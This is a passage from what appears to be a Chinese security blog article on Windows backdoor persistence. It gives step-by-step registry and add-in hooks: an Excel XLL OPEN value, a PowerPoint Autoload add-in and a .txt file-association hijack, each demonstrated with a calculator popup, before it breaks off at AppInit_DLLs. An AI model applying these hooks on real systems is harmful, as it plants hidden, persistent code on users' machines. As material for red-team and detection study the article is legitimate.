src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/34_g8EB7V2LWxSZQ28VnUeWOxic7U3myQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgyN3yC2OB8klfsGGy3BG2txgLiag8EB7V2LWxSZQ28VnUeWOxic7U3myQ/640?wx_fmt=gif'" data-type="gif" data-w="1922"  /></p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Excel XLL</span></h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Excel dll</code>的编写可以参考三好师傅这个项目：链接<br  />用三好师傅powershell脚本生成现成的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Excel dll</code>：链接</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">将生成的DLL文件复制到<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">%appdata%\Microsoft\AddIns</code>目录下，然后再修改一下注册表，<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">office</code>版本对应的注册表位置如下：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\<br  />office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\<br  />office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\<br  />office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\<br  />office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我这里使用的2010的，所以我们要修改的是<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code>，添加一个键<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">OPEN</code>，键值为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">/R test.dll</code><br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><img class="" data-ratio="0.47786537295330506" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/35_lBqKejKw1TJnL2BNrHIr1uYO6fO3kQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgyFBU8ibf4wNzUQNCpfP8EmzrYlBqKejKw1TJnL2BNrHIr1uYO6fO3kQ/640?wx_fmt=png'" data-type="png" data-w="1649"  /></code></p><p style="text-align: left;"><span style="font-size:15px;line-height:35px;;">然后打开</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Excel</span></code><span style="font-size:15px;line-height:35px;;">，发现成功弹出计算器</span></p><p style="text-align: left;"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/36_VsQgqcrjSmGZACjttQzvFF01DWYMKw.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgPQjapqOahTeRpRLgIg8yDmmeVsQgqcrjSmGZACjttQzvFF01DWYMKw/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">PowerPoint VBA add-ins</span></h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">用三好师傅powershell脚本生成现成的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">PowerPoint dll</code>：<span style="color: rgb(255, 104, 39);">https://github.com/3gstudent/Office-Persistence</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">将生成的DLL文件复制到<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">%appdata%\Microsoft\AddIns</code>目录下，然后参考前面我给出的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">office</code>版本对应的注册表位置，在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code>下新建一个子项：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">AddIns</code>，然后在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">AddIns</code>下面新建一个子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">test</code>，新建一个键为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Autoload</code>，类型为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">DWORD</code>，键值为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">1</code>；新建一个键为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Path</code>，类型为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">SZ</code>，键值为我们<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>文件的路径</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.472289156626506" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/37_TeW1hbKwbRIic0CHrexj0fpZ48icRQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgfPD7bMfC90n5xPic2NbFJ7tf5rYTeW1hbKwbRIic0CHrexj0fpZ48icRQ/640?wx_fmt=png'" data-type="png" data-w="1660"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">打开<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">PowerPoint</code>成功弹出计算器</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/38_UTliarRM8sVhqlD7DuYAvmMJpQJ6sA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg6u9TibFw1nnlKVSMckkuBLVzDwUTliarRM8sVhqlD7DuYAvmMJpQJ6sA/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">文件关联</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">什么是文件关联</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。<br  />举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。<br  />PS：来自百度百科</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们可以用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">assoc</code>命令显示或修改文件扩展名关联，我们可以看一下<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">.txt</code>文件的关联</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.25287356321839083" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/39_aibic55XeQfzRibjIQ8oN6B9PDBkCA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgdyaf7bWTnST0wtkjmvO3YHKbkBviaibic55XeQfzRibjIQ8oN6B9PDBkCA/640?wx_fmt=png'" data-type="png" data-w="609"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们可以用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">ftype</code>命令显示或修改用在文件扩展名关联中的文件类型</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.23772609819121446" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/40_ib0iaJ7xVbDotLJQuNvR7wyUUOItwg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgicIFZ5ujib9GJicjJ2LmRtk3KRTZsib0iaJ7xVbDotLJQuNvR7wyUUOItwg/640?wx_fmt=png'" data-type="png" data-w="774"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">相关注册表</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">HKEY_CURRENT_USER\Software\Classe    //保存了当前用户的类注册和文件扩展名信息<br  />HKEY_LOCAL_MACHINE\Software\Classe   //保存了系统所有用户用户的类注册和文件扩展名信息<br  />HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们以<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">.txt</code>为例，通过文件关联来修改它默认打开的程序。<br  />修改<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5060386473429952" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/41_7svlE7IJia7ib9zEbIwAwZKpSJhuPQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg3yibq1IEibu26XKrrN1IQzGficG277svlE7IJia7ib9zEbIwAwZKpSJhuPQ/640?wx_fmt=png'" data-type="png" data-w="1656"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/42_HnpBzRvQPgG5Azfv6FibxnUqoJGd4w.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgO9Qj9O7Wfibw4m5VaGrhKcFicMsHnpBzRvQPgG5Azfv6FibxnUqoJGd4w/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">AppInit_DLLs</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">User32.dll</code>被加载到进程时，会读取<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation 